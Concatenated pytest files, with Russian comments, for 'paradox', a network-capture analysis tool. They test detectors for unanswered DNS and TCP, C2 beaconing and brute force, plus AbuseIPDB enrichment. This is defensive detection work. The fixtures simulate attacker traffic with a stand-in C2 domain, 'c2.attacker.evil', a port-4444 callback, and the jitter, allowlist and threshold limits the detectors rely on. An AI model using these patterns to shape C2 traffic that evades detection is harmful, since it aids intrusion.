# ==========================================
# FILE: tests/test_absence.py
# ==========================================
"""Тесты Absence analysis."""
from paradox.analyzers.absence import analyze_absence
from paradox.models import CaptureState, FlowKey, FlowStats


def test_absence_empty():
    state = CaptureState()
    res = analyze_absence(state)
    assert res["dns_unanswered"] == []
    assert res["tcp_unanswered"] == []


def test_absence_dns_unanswered():
    state = CaptureState()
    state.dns_queries["bad.com"] = 5
    state.dns_queries["good.com"] = 1
    state.dns_answers_by_name["good.com"] = {"1.2.3.4"}

    res = analyze_absence(state)
    assert len(res["dns_unanswered"]) == 1
    assert res["dns_unanswered"][0]["qname"] == "bad.com"
    assert res["dns_unanswered"][0]["count"] == 5


def test_absence_tcp_unanswered():
    state = CaptureState()
    # Клиент (10.0.0.1) -> Сервер (10.0.0.2:80)
    k1 = FlowKey(proto="tcp", src_ip="10.0.0.1", dst_ip="10.0.0.2", src_port=12345, dst_port=80)
    state.flows[k1] = FlowStats(packets=1, initiated_by_src=True)

    # Нет обратного потока (10.0.0.2:80 -> 10.0.0.1:12345)

    res = analyze_absence(state)
    assert len(res["tcp_unanswered"]) == 1
    assert res["tcp_unanswered"][0]["src_ip"] == "10.0.0.1"
    assert res["tcp_unanswered"][0]["dst_ip"] == "10.0.0.2"


def test_absence_tcp_answered():
    state = CaptureState()
    k1 = FlowKey(proto="tcp", src_ip="10.0.0.1", dst_ip="10.0.0.2", src_port=12345, dst_port=80)
    k2 = FlowKey(proto="tcp", src_ip="10.0.0.2", dst_ip="10.0.0.1", src_port=80, dst_port=12345)
    state.flows[k1] = FlowStats(packets=1, initiated_by_src=True)
    state.flows[k2] = FlowStats(packets=1, initiated_by_src=False)

    res = analyze_absence(state)
    assert len(res["tcp_unanswered"]) == 0


# ==========================================
# FILE: tests/test_abuseipdb.py
# ==========================================
"""
Тесты AbuseIPDBEnricher. HTTP замокан — никакой сети.
"""
import time

import pytest

from paradox.integrations.abuseipdb import AbuseIPDBEnricher


def test_abuseipdb_disabled_without_key(monkeypatch):
    """Без ключа — провайдер отключён, lookup возвращает ошибку."""
    monkeypatch.delenv("ABUSEIPDB_API_KEY", raising=False)
    e = AbuseIPDBEnricher(api_key=None)
    assert not e.enabled

    result = e.lookup("8.8.8.8", "ip")
    assert not result.ok
    assert "not set" in result.error


def test_abuseipdb_enabled_with_key():
    """С ключом — провайдер включён."""
    e = AbuseIPDBEnricher(api_key="fake_key_12345")
    assert e.enabled


def test_abuseipdb_lookup_success(monkeypatch):
    """Успешный ответ — data заполнена."""
    e = AbuseIPDBEnricher(api_key="fake")
    monkeypatch.setattr(e, "_fetch", lambda ip: (
        {
            "ipAddress": "8.8.8.8",
            "abuseConfidenceScore": 0,
            "countryCode": "US",
            "isp": "Google LLC",
            "totalReports": 0,
        },
        None,
    ))
    result = e.lookup("8.8.8.8", "ip")
    assert result.ok
    assert result.source == "abuseipdb"
    assert result.data["abuseConfidenceScore"] == 0
    assert result.data["countryCode"] == "US"


def test_abuseipdb_lookup_rate_limited(monkeypatch):
    """429 — ошибка rate limited."""
    e = AbuseIPDBEnricher(api_key="fake")
    monkeypatch.setattr(e, "_fetch", lambda ip: (None, "rate limited (429)"))
    result = e.lookup("8.8.8.8", "ip")
    assert not result.ok
    assert "429" in result.error


def test_abuseipdb_lookup_unauthorized(monkeypatch):
    """401 — неверный ключ."""
    e = AbuseIPDBEnricher(api_key="bad")
    monkeypatch.setattr(e, "_fetch", lambda ip: (None, "unauthorized (401) — проверь ключ"))
    result = e.lookup("8.8.8.8", "ip")
    assert not result.ok
    assert "401" in result.error


def test_abuseipdb_lookup_unsupported_type():
    """Domain не поддержан."""
    e = AbuseIPDBEnricher(api_key="fake")
    result = e.lookup("example.com", "domain")
    assert not result.ok
    assert "unsupported" in result.error


def test_abuseipdb_ttl_short():
    """TTL AbuseIPDB — 1 день (короче Shodan)."""
    e = AbuseIPDBEnricher(api_key="fake")
    assert e.ttl_days == 1


# ==========================================
# FILE: tests/test_aggregators_entities.py
# ==========================================
"""
Unit-тесты build_entities.

Работаем с CaptureState руками. Без pcap, без scapy.
"""
from collections import Counter

from paradox.aggregators.entities import build_entities
from paradox.config import Config
from paradox.models import CaptureState, Finding, FlowKey, FlowStats


def _add_flow(state, src_ip, dst_ip, sport, dport, bytes_sent=100,
              first_ts=1.0, last_ts=1.0, sni=None):
    key = FlowKey(proto="tcp", src_ip=src_ip, dst_ip=dst_ip,
                  src_port=sport, dst_port=dport)
    fs = FlowStats(packets=1, bytes_sent=bytes_sent,
                   first_ts=first_ts, last_ts=last_ts)
    fs.sni = sni
    state.flows[key] = fs


# ---------- классификация ----------

def test_internal_external_split():
    state = CaptureState()
    _add_flow(state, "192.168.1.10", "8.8.8.8", 54000, 53)

    entities = build_entities(state, [], Config())

    internal_ips = [e.ip for e in entities.internal]
    external_ips = [e.ip for e in entities.external]

    assert "192.168.1.10" in internal_ips
    assert "8.8.8.8" in external_ips
    assert "8.8.8.8" not in internal_ips


# ---------- агрегация ----------

def test_flow_and_bytes_aggregation():
    state = CaptureState()
    _add_flow(state, "192.168.1.10", "8.8.8.8", 54000, 53, bytes_sent=100)
    _add_flow(state, "192.168.1.10", "8.8.8.8", 54001, 53, bytes_sent=200)
    _add_flow(state, "8.8.8.8", "192.168.1.10", 53, 54000, bytes_sent=50)

    entities = build_entities(state, [], Config())

    client = next(e for e in entities.internal if e.ip == "192.168.1.10")
    server = next(e for e in entities.external if e.ip == "8.8.8.8")

    assert client.flows_out == 2
    assert client.flows_in == 1
    assert client.bytes_out == 300
    assert client.bytes_in == 50

    assert server.flows_in == 2
    assert server.flows_out == 1
    assert server.bytes_in == 300
    assert server.bytes_out == 50


# ---------- SNI ----------

def test_sni_written_to_both_ends():
    state = CaptureState()
    _add_flow(state, "192.168.1.10", "203.0.113.5", 54000, 443,
              sni="example.com")

    entities = build_entities(state, [], Config())

    client = next(e for e in entities.internal if e.ip == "192.168.1.10")
    server = next(e for e in entities.external if e.ip == "203.0.113.5")

    assert "example.com" in client.sni_domains
    assert "example.com" in server.sni_domains


# ---------- DNS by src ----------

def test_dns_names_attached_to_client():
    state = CaptureState()
    state.dns_queries_by_src["192.168.1.10"] = Counter({
        "google.com": 5, "yandex.ru": 3,
    })

    entities = build_entities(state, [], Config())

    client = next(e for e in entities.internal if e.ip == "192.168.1.10")
    assert "google.com" in client.dns_names
    assert "yandex.ru" in client.dns_names


# ---------- findings ----------

def test_nxdomain_burst_creates_victim_candidate():
    state = CaptureState()
    findings = [Finding(type="nxdomain_burst", value="192.168.1.10",
                        confidence=0.85)]

    entities = build_entities(state, findings, Config())

    client = next(e for e in entities.internal if e.ip == "192.168.1.10")
    assert "victim_candidate" in client.roles
    assert 0 in client.findings_indices


def test_suspicious_port_external_creates_c2_candidate():
    state = CaptureState()
    findings = [Finding(
        type="suspicious_port",
        value="203.0.113.66:4444",
        confidence=0.5,
        evidence={"src_ip": "192.168.1.10", "dst_ip": "203.0.113.66",
                  "dst_port": 4444},
    )]

    entities = build_entities(state, findings, Config())

    victim = next(e for e in entities.internal if e.ip == "192.168.1.10")
    c2 = next(e for e in entities.external if e.ip == "203.0.113.66")

    assert "victim_candidate" in victim.roles
    assert "c2_candidate" in c2.roles


# ---------- special IPs ----------

def test_special_ips_excluded():
    state = CaptureState()
    _add_flow(state, "192.168.1.10", "239.255.255.250", 54000, 1900)
    _add_flow(state, "192.168.1.10", "255.255.255.255", 54000, 67)
    _add_flow(state, "127.0.0.1", "192.168.1.10", 54000, 80)

    entities = build_entities(state, [], Config())

    all_ips = {e.ip for e in entities.internal + entities.external}
    assert "239.255.255.250" not in all_ips
    assert "255.255.255.255" not in all_ips
    assert "127.0.0.1" not in all_ips
    assert "192.168.1.10" in all_ips


# ---------- gateway ----------

def test_gateway_candidate_role():
    state = CaptureState()
    for i in range(60):
        dst = f"203.0.113.{i % 15 + 1}"
        _add_flow(state, "192.168.1.1", dst, 54000 + i, 443)

    entities = build_entities(state, [], Config())

    gw = next(e for e in entities.internal if e.ip == "192.168.1.1")
    assert "gateway_candidate" in gw.roles


# ---------- brute_force roles ----------

def test_brute_force_creates_attacker_and_victim():
    """brute_force finding → src_ip=attacker_candidate, dst_ip=victim_candidate."""
    state = CaptureState()
    findings = [Finding(
        type="brute_force",
        value="10.0.1.50 -> 192.168.1.12:80",
        confidence=0.95,
        evidence={
            "src_ip": "10.0.1.50",
            "dst_ip": "192.168.1.12",
            "dst_port": 80,
            "flow_count": 230,
        },
    )]

    entities = build_entities(state, findings, Config())

    attacker = next(e for e in entities.internal if e.ip == "10.0.1.50")
    victim = next(e for e in entities.internal if e.ip == "192.168.1.12")

    assert "attacker_candidate" in attacker.roles
    assert "victim_candidate" in victim.roles
    assert "attacker_candidate" not in victim.roles


def test_suspicious_port_src_is_victim_not_attacker():
    """suspicious_port → src_ip=victim_candidate (жертва стучится наружу)."""
    state = CaptureState()
    findings = [Finding(
        type="suspicious_port",
        value="203.0.113.66:4444",
        confidence=0.5,
        evidence={
            "src_ip": "192.168.1.10",
            "dst_ip": "203.0.113.66",
            "dst_port": 4444,
        },
    )]

    entities = build_entities(state, findings, Config())

    victim = next(e for e in entities.internal if e.ip == "192.168.1.10")
    c2 = next(e for e in entities.external if e.ip == "203.0.113.66")

    assert "victim_candidate" in victim.roles
    assert "attacker_candidate" not in victim.roles
    assert "c2_candidate" in c2.roles


# ==========================================
# FILE: tests/test_analyzer_ndp.py
# ==========================================
"""Тесты агрегатора NDP."""
from dataclasses import dataclass
import ipaddress
import struct

from paradox.analyzers.ndp import analyze_ndp


@dataclass
class MockRecord:
    ts: float
    src_ip: str
    dst_ip: str
    ip_proto: int
    payload: bytes


def _mac_option(opt_type, mac_str):
    mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
    return struct.pack("!BB", opt_type, 1) + mac_bytes


def test_analyze_ndp_empty():
    assert analyze_ndp([]) == {"total": 0, "neighbors": [], "routers": []}


def test_analyze_ndp():
    # NA (neighbor advertisement)
    flags = 0x60
    target_ip = ipaddress.IPv6Address("2001:db8::2").packed
    p1 = struct.pack("!BBH", 136, 0, 0) + struct.pack("!B3x", flags) + target_ip
    p1 += _mac_option(2, "00:11:22:33:44:55")
    r1 = MockRecord(1000.0, "2001:db8::2", "2001:db8::1", 58, p1)

    # RA (router advertisement)
    p2 = struct.pack("!BBHBBHII", 134, 0, 0, 64, 0, 1800, 0, 0)
    p2 += _mac_option(1, "aa:bb:cc:dd:ee:ff")
    r2 = MockRecord(1001.0, "fe80::1", "ff02::1", 58, p2)

    # NS (neighbor solicitation)
    target_ip3 = ipaddress.IPv6Address("2001:db8::3").packed
    p3 = struct.pack("!BBH", 135, 0, 0) + b"\x00" * 4 + target_ip3
    p3 += _mac_option(1, "11:22:33:44:55:66")
    r3 = MockRecord(1002.0, "2001:db8::1", "ff02::1:ff00:3", 58, p3)

    res = analyze_ndp([r1, r2, r3])

    assert res["total"] == 3
    assert res["routers"] == ["fe80::1"]

    neighbors = {n["ip"]: n["mac"] for n in res["neighbors"]}
    assert neighbors["2001:db8::2"] == "00:11:22:33:44:55"
    assert neighbors["2001:db8::3"] == "11:22:33:44:55:66"


# ==========================================
# FILE: tests/test_auto_explain.py
# ==========================================
"""Тесты автогенерации confidence_reasons."""
from paradox.models import Finding
from paradox.detectors.explainer import build_reasons


def test_build_reasons_empty():
    assert build_reasons({}) == []


def test_build_reasons_known_keys():
    ev = {"packets_total": 100, "unique_src_ports": 50}
    reasons = build_reasons(ev)
    assert "Всего пакетов: 100" in reasons
    assert "Уникальных src-портов: 50" in reasons


def test_build_reasons_unknown_keys():
    ev = {"foo": "bar", "baz": 42}
    reasons = build_reasons(ev)
    assert len(reasons) == 2
    assert "foo: bar" in reasons


def test_finding_auto_reasons():
    f = Finding(
        type="test",
        value="test",
        confidence=0.8,
        evidence={"packets_total": 10},
    )
    assert f.confidence_reasons == ["Всего пакетов: 10"]


def test_finding_custom_reasons_override():
    f = Finding(
        type="test",
        value="test",
        confidence=0.8,
        evidence={"packets_total": 10},
        confidence_reasons=["Своя причина"],
    )
    assert f.confidence_reasons == ["Своя причина"]


# ==========================================
# FILE: tests/test_base_enricher.py
# ==========================================
"""Тесты базового класса enrichment-провайдеров."""
from unittest.mock import MagicMock, patch
from urllib.error import HTTPError

import pytest

from paradox.integrations.base_enricher import BaseEnricher


class DummyEnricher(BaseEnricher):
    name = "dummy"
    supports = ("ip", "domain")
    ttl_days = 7
    ttl_days_negative = 1

    def __init__(self, mock_response=None, mock_error=None):
        self._mock_response = mock_response
        self._mock_error = mock_error

    def _fetch(self, ioc, ioc_type):
        if self._mock_error is not None:
            return None, self._mock_error
        return self._mock_response, None


@pytest.fixture
def mock_urlopen():
    with patch("urllib.request.urlopen") as mock:
        yield mock


def test_http_get_json_success(mock_urlopen):
    """200 OK → JSON разбирается в dict."""
    resp = MagicMock()
    resp.read.return_value = b'{"key": "value"}'
    resp.__enter__ = MagicMock(return_value=resp)
    resp.__exit__ = MagicMock(return_value=None)
    mock_urlopen.return_value = resp

    e = DummyEnricher()
    data, error = e._http_get_json("https://example.com/api")
    assert data == {"key": "value"}
    assert error is None


def test_http_get_json_404(mock_urlopen):
    """404 → спец-сигнал __not_found__."""
    mock_urlopen.side_effect = HTTPError(
        url="https://example.com", code=404, msg="Not Found", hdrs={}, fp=None
    )
    e = DummyEnricher()
    data, error = e._http_get_json("https://example.com/api")
    assert data is None
    assert error == "__not_found__"


def test_http_get_json_401(mock_urlopen):
    """401 → сообщение про ключ."""
    mock_urlopen.side_effect = HTTPError(
        url="https://example.com", code=401, msg="Unauthorized", hdrs={}, fp=None
    )
    e = DummyEnricher()
    _, error = e._http_get_json("https://example.com/api")
    assert "unauthorized" in error.lower()


def test_http_get_json_429(mock_urlopen):
    """429 → rate limited."""
    mock_urlopen.side_effect = HTTPError(
        url="https://example.com", code=429, msg="Too Many Requests", hdrs={}, fp=None
    )
    e = DummyEnricher()
    _, error = e._http_get_json("https://example.com/api")
    assert "rate limited" in error.lower()


def test_http_get_json_500(mock_urlopen):
    """5xx → server error."""
    mock_urlopen.side_effect = HTTPError(
        url="https://example.com", code=503, msg="Service Unavailable", hdrs={}, fp=None
    )
    e = DummyEnricher()
    _, error = e._http_get_json("https://example.com/api")
    assert "server error" in error.lower()


def test_resolve_not_found():
    """__not_found__ превращается в (None, None)."""
    e = DummyEnricher()
    data, error = e._resolve_not_found(None, "__not_found__")
    assert data is None
    assert error is None


def test_lookup_unsupported_type():
    """Тип не поддерживается → ошибка, а не запрос."""
    e = DummyEnricher()
    result = e.lookup("value", "hash")  # DummyEnricher не поддерживает hash
    assert not result.ok
    assert "unsupported ioc_type" in result.error


def test_lookup_negative_caching():
    """404 → пустой result, но TTL = ttl_days_negative."""
    e = DummyEnricher()
    e._mock_response = None  # 404 → data=None
    # Наследуем базовый lookup: он с ttl_days_negative для пустых
    result = e.lookup("8.8.8.8", "ip")
    assert result.ok
    assert result.data == {}
    assert result.ttl_days == e.ttl_days_negative


# ==========================================
# FILE: tests/test_beaconing.py
# ==========================================
"""
Тесты BeaconingDetector.

Проверяем:
- периодические соединения → finding
- нерегулярные → нет
- мало соединений → нет
- большие соединения → нет (это не heartbeat, а загрузка)
- allowlist SNI/Host (CDN/analytics)
- payload variance (const vs random)
- rate check (burst vs beacon)
- skip internal dst
- multi-tenant filter (0.7.0)
- mail-port filter (0.7.0)

Плюс регрессии на будущее — если что-то поедет в алгоритме.
"""
from paradox.config import Config
from paradox.detectors.beaconing import BeaconingDetector
from paradox.models import CaptureState, FlowKey, FlowStats


def _beacon_state(
    flows,
    sni=None,
    http_host=None,
    sni_list=None,
    host_list=None,
):
    """
    flows: list of (src, dst, dport, sport, first_ts, packets, bytes).

    sni / http_host — проставить всем flow одно значение.
    sni_list / host_list — по индексу flow (циклически).
    Приоритет: list > single.
    """
    state = CaptureState()
    for i, (src, dst, dport, sport, ts, pkts, byts) in enumerate(flows):
        key = FlowKey(
            proto="tcp", src_ip=src, dst_ip=dst,
            src_port=sport, dst_port=dport,
        )
        fs = FlowStats(packets=pkts, bytes_sent=byts)
        fs.first_ts = ts
        fs.last_ts = ts + 1.0
        if sni_list is not None:
            fs.sni = sni_list[i % len(sni_list)]
        elif sni is not None:
            fs.sni = sni
        if host_list is not None:
            fs.http_host = host_list[i % len(host_list)]
        elif http_host is not None:
            fs.http_host = http_host
        state.flows[key] = fs
    return state


def _regular_flows(
    n=25,
    interval=60.0,
    jitter_offset=0.0,
    src="192.168.1.100",
    dst="203.0.113.5",
    dport=443,
    sport_base=50000,
    pkts=5,
    byts=500,
):
    """
    N flows с интервалом `interval` и опциональным +/- `jitter_offset`.

    Математика jitter (важно для выбора значений):
      jitter_offset | intervals | pstdev | jitter ≈
      --------------|-----------|--------|----------
             0      | 60, 60    |   0    |   0
            ±1      | 58, 62    |   2    |   0.033
            ±2      | 56, 64    |   4    |   0.067
            ±3      | 54, 66    |   6    |   0.100  ← граница
            ±4      | 52, 68    |   8    |   0.133  ← режется
    """
    flows = []
    for i in range(n):
        offset = 0.0
        if jitter_offset and i % 2 == 0:
            offset = jitter_offset
        elif jitter_offset:
            offset = -jitter_offset
        ts = 1000.0 + i * interval + offset
        flows.append((src, dst, dport, sport_base + i, ts, pkts, byts))
    return flows


# ---------------------------------------------------------------------
# базовые сценарии
# ---------------------------------------------------------------------

def test_beaconing_detects_periodic():
    """25 соединений с интервалом 60 сек — типичный C2 heartbeat."""
    flows = _regular_flows(n=25, interval=60.0)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 1
    assert findings[0].type == "beaconing"
    assert findings[0].evidence["count"] == 25
    assert findings[0].confidence > 0.7
    assert findings[0].evidence["mean_interval_sec"] == 60.0


def test_beaconing_ignores_irregular():
    """Те же 25 соединений, но с большим jitter — это не beacon."""
    flows = []
    ts = 1000.0
    for i in range(25):
        ts += 30.0 if i % 2 == 0 else 230.0
        flows.append(("192.168.1.100", "203.0.113.5", 443, 50000 + i, ts, 5, 500))
    state = _beacon_state(flows)
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_below_min_connections():
    """5 соединений — меньше порога 20."""
    flows = _regular_flows(n=5)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_ignores_large_transfers():
    """Регулярные соединения, но с большим объёмом — не heartbeat."""
    flows = _regular_flows(n=25, byts=500_000)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_below_min_duration():
    """
    25 соединений с интервалом 20 сек.

    duration = 24 * 20 = 480 < 600 → не finding.
    rate = 25 / (480/60) = 3.125 < 5 → rate не мешает.
    """
    flows = _regular_flows(n=25, interval=20.0)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


# ---------------------------------------------------------------------
# jitter / confidence
# ---------------------------------------------------------------------

def test_beaconing_confidence_scales_with_jitter():
    """Меньше jitter — выше confidence. Все три уровня в окне jitter<0.1."""
    # Идеальный интервал 60.0, jitter = 0
    flows_perfect = _regular_flows(n=25, interval=60.0, jitter_offset=0.0)
    # ±1 → интервалы 58/62, pstdev=2, jitter ≈ 0.033
    flows_low = _regular_flows(n=25, interval=60.0, jitter_offset=1.0)
    # ±2 → интервалы 56/64, pstdev=4, jitter ≈ 0.067
    flows_mid = _regular_flows(n=25, interval=60.0, jitter_offset=2.0)

    f_perfect = BeaconingDetector().run(_beacon_state(flows_perfect), Config())
    f_low = BeaconingDetector().run(_beacon_state(flows_low), Config())
    f_mid = BeaconingDetector().run(_beacon_state(flows_mid), Config())

    assert len(f_perfect) == 1
    assert len(f_low) == 1
    assert len(f_mid) == 1

    c_perfect = f_perfect[0].confidence
    c_low = f_low[0].confidence
    c_mid = f_mid[0].confidence

    # 0.85 > 0.767 > 0.683
    assert c_perfect > c_low > c_mid
    assert c_perfect >= 0.80
    assert c_mid >= 0.65


# ---------------------------------------------------------------------
# агрегация и группировка
# ---------------------------------------------------------------------

def test_beaconing_aggregates_by_flow_key():
    """Разные src_ports, но один (src_ip, dst_ip, dst_port) — один group."""
    flows = _regular_flows(n=25)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 1
    assert findings[0].evidence["count"] == 25


def test_beaconing_separate_targets():
    """Два разных dst → два finding'а."""
    flows = []
    flows += _regular_flows(n=25, dst="203.0.113.5", sport_base=50000)
    flows += _regular_flows(n=25, dst="203.0.113.6", sport_base=60000)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 2
    values = sorted(f.value for f in findings)
    assert values == [
        "192.168.1.100 -> 203.0.113.5:443",
        "192.168.1.100 -> 203.0.113.6:443",
    ]


# ---------------------------------------------------------------------
# allowlist SNI / Host / IP
# ---------------------------------------------------------------------

def test_beaconing_skips_allowlist_sni():
    """Chrome keepalive к google-analytics.com не должен быть beaconing."""
    flows = _regular_flows(n=25, byts=200)
    state = _beacon_state(flows, sni="www.google-analytics.com")
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_skips_allowlist_sni_doubleclick():
    """stats.g.doubleclick.net — analytics CDN."""
    flows = _regular_flows(n=25, byts=200)
    state = _beacon_state(flows, sni="stats.g.doubleclick.net")
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_skips_allowlist_http_host():
    """HTTP Host из allowlist → skip."""
    flows = _regular_flows(n=25, byts=200)
    state = _beacon_state(flows, http_host="www.google-analytics.com")
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_skips_allowlist_dst_ip():
    """dst_ip из beaconing_allowlist_ips → skip."""
    flows = _regular_flows(n=25, dst="1.2.3.4", byts=200)
    state = _beacon_state(flows)
    cfg = Config(beaconing_allowlist_ips=frozenset({"1.2.3.4"}))
    findings = BeaconingDetector().run(state, cfg)
    assert findings == []


def test_beaconing_non_allowlist_sni_still_detected():
    """SNI, которого нет в allowlist, не должен глушить finding."""
    flows = _regular_flows(n=25, byts=400)
    state = _beacon_state(flows, sni="c2.attacker.evil")
    findings = BeaconingDetector().run(state, Config())
    assert len(findings) == 1


# ---------------------------------------------------------------------
# payload variance
# ---------------------------------------------------------------------

def test_beaconing_rejects_variable_payload_size():
    """
    C2 = const payload. Browser = разный.

    avg ≈ 730 < 5000 (старая проверка пропустила бы).
    stddev/mean ≈ 0.85 > 0.5 → ловит новый фильтр.
    """
    sizes = [100, 800, 200, 1500, 300, 900, 150, 2000, 250, 1100]
    flows = []
    for i in range(25):
        ts = 1000.0 + i * 60.0
        flows.append((
            "192.168.1.100", "203.0.113.5", 443, 50000 + i,
            ts, 5, sizes[i % len(sizes)],
        ))
    state = _beacon_state(flows)
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_accepts_const_payload():
    """Const payload → фильтр не мешает."""
    flows = _regular_flows(n=25, byts=400)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 1


# ---------------------------------------------------------------------
# rate check
# ---------------------------------------------------------------------

def test_beaconing_rejects_parallel_burst():
    """
    100 соединений за ~11 минут.

    duration = 99 * 7 = 693 > 600 (duration OK).
    rate = 100 / 11.55 ≈ 8.66/min > 5 → rate check рубит.
    """
    flows = _regular_flows(n=100, interval=7.0)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_rate_check_not_triggered_for_slow_beacon():
    """60-секундный интервал = 1 flow/min, rate не мешает."""
    flows = _regular_flows(n=25, interval=60.0)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 1


# ---------------------------------------------------------------------
# skip internal
# ---------------------------------------------------------------------

def test_beaconing_skips_internal_dst():
    """
    C2 обычно external. internal → internal — отдельная история.
    """
    flows = _regular_flows(
        n=25, dst="192.168.1.200", dport=5985, byts=200,
    )
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_internal_dst_not_skipped_when_disabled():
    """Если skip отключён, internal → internal находится."""
    flows = _regular_flows(
        n=25, dst="192.168.1.200", dport=5985, byts=200,
    )
    cfg = Config(beaconing_skip_internal_dst=False)
    findings = BeaconingDetector().run(_beacon_state(flows), cfg)
    assert len(findings) == 1


# ---------------------------------------------------------------------
# threshold boundary
# ---------------------------------------------------------------------

def test_beaconing_threshold_boundary():
    """19 flows — нет, 20 — да."""
    f19 = BeaconingDetector().run(
        _beacon_state(_regular_flows(n=19)), Config(),
    )
    f20 = BeaconingDetector().run(
        _beacon_state(_regular_flows(n=20)), Config(),
    )
    assert f19 == []
    assert len(f20) == 1


# ---------------------------------------------------------------------
# регрессия: настоящий C2 должен ловиться после всех новых фильтров
# ---------------------------------------------------------------------

def test_beaconing_real_c2_still_detected():
    """
    Все фильтры против настоящего C2:
    - dst external, не в allowlist IP
    - SNI не в allowlist
    - 25 connections, 60s ± 1s → jitter ≈ 0.033
    - const payload 400B
    - rate ≈ 1/min
    """
    flows = _regular_flows(
        n=25, interval=60.0, jitter_offset=1.0,
        dst="8.8.8.8", dport=8443, byts=400,
    )
    state = _beacon_state(flows, sni="c2.attacker.evil")
    findings = BeaconingDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].type == "beaconing"
    assert findings[0].confidence >= 0.7


# ---------------------------------------------------------------------
# multi-tenant filter (0.7.0)
# ---------------------------------------------------------------------

def test_beaconing_skips_multi_tenant_cdn():
    """
    Chrome к Akamai: 25 соединений к одному IP, но SNI разные.
    C2 использует ОДИН домен. >1 уникального SNI = shared edge.
    """
    flows = _regular_flows(n=25, byts=400)
    sni_list = [
        "a248.e.akamai.net",
        "e1234.dscx.akamaiedge.net",
        "safebrowsing.google.com",
        "c.go-mpulse.net",
        "e5678.g.akamaiedge.net",
    ]
    state = _beacon_state(flows, sni_list=sni_list)
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_skips_multi_tenant_mixed_sni_host():
    """
    SNI + HTTP Host считаются вместе. 1 SNI + 1 Host = 2 destinations.
    """
    flows = _regular_flows(n=25, byts=400)
    state = _beacon_state(
        flows,
        sni="cdn.example.net",
        http_host="telemetry.example.net",
    )
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_single_sni_not_in_allowlist_detected():
    """Один SNI, не в allowlist → finding."""
    flows = _regular_flows(n=25, byts=400)
    state = _beacon_state(flows, sni="c2.attacker.evil")
    findings = BeaconingDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["unique_destinations"] == ["c2.attacker.evil"]


def test_beaconing_no_sni_single_ip_detected():
    """Нет SNI/Host (raw IP) → всё ещё C2-кандидат."""
    flows = _regular_flows(n=25, byts=400)
    state = _beacon_state(flows)
    findings = BeaconingDetector().run(state, Config())
    assert len(findings) == 1
    assert findings[0].evidence["unique_destinations"] == []


# ---------------------------------------------------------------------
# mail-port filter (0.7.0)
# ---------------------------------------------------------------------

def test_beaconing_skips_pop3():
    """Порт 110 = POP3. Mail polling — не C2."""
    flows = _regular_flows(n=25, dport=110, byts=400)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_skips_imap():
    """Порт 143 = IMAP."""
    flows = _regular_flows(n=25, dport=143, byts=400)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert findings == []


def test_beaconing_skips_imaps_pop3s():
    """993 = IMAPS, 995 = POP3S."""
    for port in (993, 995):
        flows = _regular_flows(n=25, dport=port, byts=400)
        findings = BeaconingDetector().run(_beacon_state(flows), Config())
        assert findings == [], f"port {port} should be skipped"


def test_beaconing_smtp_not_skipped():
    """
    SMTP (25) НЕ в mail-фильтре. Malware может использовать SMTP-туннель.
    """
    flows = _regular_flows(n=25, dport=25, byts=400)
    findings = BeaconingDetector().run(_beacon_state(flows), Config())
    assert len(findings) == 1


# ---------------------------------------------------------------------
# прочее
# ---------------------------------------------------------------------

def test_beaconing_ignores_udp():
    """UDP не считается — beaconing на TCP."""
    state = CaptureState()
    for i in range(25):
        key = FlowKey(
            proto="udp", src_ip="192.168.1.100", dst_ip="203.0.113.5",
            src_port=50000 + i, dst_port=53,
        )
        fs = FlowStats(packets=2, bytes_sent=100)
        fs.first_ts = 1000.0 + i * 60.0
        fs.last_ts = fs.first_ts + 0.5
        state.flows[key] = fs
    findings = BeaconingDetector().run(state, Config())
    assert findings == []


def test_beaconing_empty_state():
    """Пустой CaptureState — не падает."""
    findings = BeaconingDetector().run(CaptureState(), Config())
    assert findings == []


# ==========================================
# FILE: tests/test_brute_force.py
# ==========================================
"""
Unit-тесты BruteForceDetector.

Работаем с CaptureState руками. Проверяем:
- детект при 20+ flows с уникальными src_ports,
- игнор при <20 flows,
- игнор длинной сессии (много пакетов на flow),
- игнор port scan (разные dst_port, по 1 flow),
- кастомные пороги через Config,
- агрегацию (несколько dst_port — разные findings).
"""
from paradox.config import Config
from paradox.detectors.brute_force import BruteForceDetector
from paradox.models import CaptureState, FlowKey, FlowStats


def _add_flow(state, src_ip, dst_ip, sport, dport,
              packets=1, bytes_sent=100, ts=1.0):
    key = FlowKey(proto="tcp", src_ip=src_ip, dst_ip=dst_ip,
                  src_port=sport, dst_port=dport)
    state.flows[key] = FlowStats(
        packets=packets, bytes_sent=bytes_sent,
        first_ts=ts, last_ts=ts,
    )


# ---------- основной сценарий ----------

def test_brute_force_detected():
    """230 flows с уникальными src_ports к одной цели → finding."""
    state = CaptureState()
    for i in range(230):
        _add_flow(
            state,
            "10.0.1.50", "192.168.1.12", 50000 + i, 80,
            packets=2, bytes_sent=200,
        )

    findings = BruteForceDetector().run(state, Config())

    assert len(findings) == 1
    assert findings[0].type == "brute_force"
    assert findings[0].value == "10.0.1.50 -> 192.168.1.12:80"
    assert findings[0].evidence["flow_count"] == 230
